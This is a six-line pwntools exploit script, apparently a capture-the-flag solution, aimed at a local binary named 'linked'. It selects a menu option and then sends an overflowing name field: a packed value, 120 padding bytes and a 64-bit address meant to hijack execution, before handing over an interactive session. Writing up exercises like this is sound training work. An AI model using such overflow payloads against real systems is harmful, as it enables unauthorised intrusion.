from pwn import *
p=process("./linked")
p.sendlineafter(b'(1-24) ',b'1')
input()
p.sendlineafter(b'name? ',p32(0x31323334)+b'Hell'+b'a'*120+p64(0x4053dc))
p.interactive()
